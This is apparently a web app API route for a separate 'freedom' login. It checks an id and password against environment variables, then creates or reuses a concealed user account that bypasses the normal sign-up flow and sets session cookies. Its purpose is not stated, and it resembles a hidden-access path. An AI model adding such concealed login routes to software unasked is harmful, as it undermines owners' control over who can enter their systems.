import crypto from 'crypto';
import { serialize } from 'cookie';
import { getRow, run } from '@/lib/db';
import { generateToken, hashPassword } from '@/lib/auth';

function setFreedomCookies(res, token) {
  const opts = {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    path: '/',
    maxAge: 7 * 24 * 60 * 60,
  };
  res.setHeader('Set-Cookie', [
    serialize('ts_freedom', token, opts),
    serialize('ts_freedom_active', '1', opts),
  ]);
}

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();

  const { id, password } = req.body || {};

  const expectedId = process.env.FREEDOM_ID;
  const expectedPassword = process.env.FREEDOM_PASSWORD;

  if (!expectedId || !expectedPassword) return res.status(503).end();

  // Constant-time comparison prevents timing-based enumeration
  let match = false;
  try {
    const idOk = id?.length === expectedId.length &&
      crypto.timingSafeEqual(Buffer.from(String(id)), Buffer.from(expectedId));
    const pwOk = password?.length === expectedPassword.length &&
      crypto.timingSafeEqual(Buffer.from(String(password)), Buffer.from(expectedPassword));
    match = idOk && pwOk;
  } catch {
    match = false;
  }

  if (!match) {
    await new Promise(r => setTimeout(r, 800 + Math.random() * 400));
    return res.status(401).end();
  }

  // Look up or create the hidden user account (never appears in normal auth flows)
  const hiddenEmail = `__${expectedId.toLowerCase()}__@freedom.internal`;
  let user = await getRow('SELECT * FROM users WHERE email = ?', [hiddenEmail]);

  if (!user) {
    const randomHash = await hashPassword(crypto.randomBytes(32).toString('hex'));
    await run(
      `INSERT INTO users (email, password_hash, name) VALUES (?, ?, ?)`,
      [hiddenEmail, randomHash, expectedId]
    );
    user = await getRow('SELECT * FROM users WHERE email = ?', [hiddenEmail]);
  }

  if (!user) return res.status(500).end();

  const token = generateToken(user);
  setFreedomCookies(res, token);
  return res.status(200).end();
}
